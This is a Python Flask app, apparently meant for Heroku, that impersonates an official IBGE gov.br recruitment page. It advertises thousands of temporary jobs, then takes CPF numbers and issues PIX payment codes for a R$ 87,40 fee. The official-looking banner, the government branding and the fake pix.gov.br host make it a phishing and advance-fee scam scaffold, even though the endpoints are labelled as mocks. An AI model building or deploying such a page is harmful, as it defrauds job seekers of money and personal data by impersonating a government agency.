"""
Aplicação Flask ultra-simplificada para Heroku - Versão Mínima
IBGE Trabalhe Conosco - Portal Gov.br
"""
import os
import logging
import random
from flask import Flask, jsonify

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Criar app Flask
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "heroku-ibge-secret-key-2025")

@app.route('/')
def index():
    """Página inicial - HTML inline mínimo"""
    return """
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>IBGE - Trabalhe Conosco - Portal Gov.br</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            .govbr-blue { color: #1351B4; }
            .bg-govbr-blue { background-color: #1351B4; }
        </style>
    </head>
    <body class="bg-gray-50">
        <div class="container mx-auto px-4 py-8 max-w-4xl">
            <div class="bg-white rounded-lg shadow-lg p-8">
                <h1 class="text-4xl font-bold govbr-blue mb-6">IBGE - Trabalhe Conosco</h1>
                
                <div class="bg-blue-50 border-l-4 border-blue-500 p-6 mb-6">
                    <h2 class="text-2xl font-semibold govbr-blue mb-4">COMUNICADO OFICIAL — EDITAL PUBLICADO</h2>
                    <p class="text-gray-800 mb-4">O Instituto Brasileiro de Geografia e Estatística (IBGE) está com <strong>Processo Seletivo Simplificado</strong> aberto para contratação por tempo determinado de profissionais para atuarem na coleta e supervisão de dados estatísticos e geográficos em todo o território nacional.</p>
                </div>
                
                <div class="grid md:grid-cols-2 gap-6 mb-8">
                    <div class="bg-green-50 p-6 rounded-lg border border-green-200">
                        <h3 class="text-xl font-semibold text-green-800 mb-3">🎯 Agente de Pesquisa e Mapeamento</h3>
                        <p class="text-green-700 mb-2"><strong>8.480 vagas</strong></p>
                        <p class="text-green-700"><strong>Salário: R$ 4.379,00</strong></p>
                    </div>
                    
                    <div class="bg-blue-50 p-6 rounded-lg border border-blue-200">
                        <h3 class="text-xl font-semibold text-blue-800 mb-3">👨‍💼 Supervisor de Coleta e Qualidade</h3>
                        <p class="text-blue-700 mb-2"><strong>1.100 vagas</strong></p>
                        <p class="text-blue-700"><strong>Salário: R$ 4.978,00</strong></p>
                    </div>
                </div>
                
                <div class="bg-yellow-50 border border-yellow-200 p-6 rounded-lg mb-6">
                    <h3 class="text-lg font-semibold text-yellow-800 mb-3">📅 Cronograma</h3>
                    <ul class="text-yellow-700 space-y-2">
                        <li><strong>Inscrições:</strong> 05/07/2025 a 25/07/2025</li>
                        <li><strong>Provas:</strong> 24/08/2025 (domingo)</li>
                        <li><strong>Organizadora:</strong> Fundação Getulio Vargas (FGV)</li>
                    </ul>
                </div>
                
                <div class="text-center">
                    <a href="/health" class="bg-govbr-blue text-white px-8 py-3 rounded-lg font-semibold hover:bg-blue-700 transition-colors">
                        Verificar Status do Sistema
                    </a>
                </div>
                
                <div class="mt-8 text-center text-sm text-gray-600">
                    <p>Portal oficial do Instituto Brasileiro de Geografia e Estatística</p>
                    <p>Governo Federal do Brasil</p>
                </div>
            </div>
        </div>
    </body>
    </html>
    """

@app.route('/health')
def health():
    """Health check para Heroku"""
    return jsonify({
        'status': 'ok', 
        'message': 'IBGE Trabalhe Conosco funcionando no Heroku',
        'app': 'heroku_app_simple.py',
        'version': '2.0'
    })

@app.route('/validar-cpf', methods=['POST'])
def validar_cpf():
    """Mock de validação de CPF para Heroku"""
    try:
        from flask import request
        data = request.get_json()
        cpf = data.get('cpf', '').replace('.', '').replace('-', '')
        
        if not cpf or len(cpf) != 11:
            return jsonify({'success': False, 'message': 'CPF inválido'})
        
        # Mock de dados para demonstração
        return jsonify({
            'success': True,
            'dados': {
                'nome': 'JOSÉ DA SILVA SANTOS',
                'cpf': cpf,
                'cpf_formatado': f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}",
                'data_nascimento': '15/03/1985',
                'data_nascimento_formatada': '15/03/1985',
                'nome_mae': 'MARIA DOS SANTOS SILVA',
                'sexo': 'MASCULINO',
                'situacao': 'REGULAR'
            }
        })
            
    except Exception as e:
        logger.error(f"Erro na validação CPF: {str(e)}")
        return jsonify({'success': False, 'message': f'Erro interno: {str(e)}'})

@app.route('/api/gerar-pix', methods=['POST'])
def gerar_pix():
    """Gerar pagamento PIX - Mock para Heroku"""
    try:
        from flask import request
        data = request.get_json()
        
        # Gerar PIX mock
        transacao_id = random.randint(700000, 799999)
        pix_code = f"00020101021226840014br.gov.bcb.pix2562heroku.pix.gov.br/qr/{transacao_id}5204000053039865802BR5924IBGE TRABALHE CONOSCO6009SAO PAULO62070503***6304{random.randint(1000, 9999)}"
        
        logger.info(f"PIX Heroku gerado - ID: {transacao_id}")
        
        return jsonify({
            'success': True,
            'transacao_id': transacao_id,
            'pix_code': pix_code,
            'qr_code': pix_code,
            'valor': "R$ 87,40",
            'status': 'pending',
            'api_provider': 'Heroku Mock PIX - Demo'
        })
            
    except Exception as e:
        logger.error(f"Erro ao gerar PIX: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Erro interno: {str(e)}'
        })

@app.route('/api/verificar-pagamento/<int:transacao_id>')
def verificar_pagamento(transacao_id):
    """Verificar pagamento PIX - Mock para Heroku"""
    try:
        # Mock: 30% de chance de estar pago
        import random
        status = 'confirmed' if random.random() > 0.7 else 'pending'
        
        return jsonify({
            'success': True,
            'transacao_id': transacao_id,
            'status': status,
            'valor': 'R$ 87,40',
            'api_provider': 'Heroku Mock PIX - Demo'
        })
        
    except Exception as e:
        logger.error(f"Erro ao verificar pagamento: {str(e)}")
        return jsonify({
            'success': False,
            'message': f'Erro interno: {str(e)}'
        })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)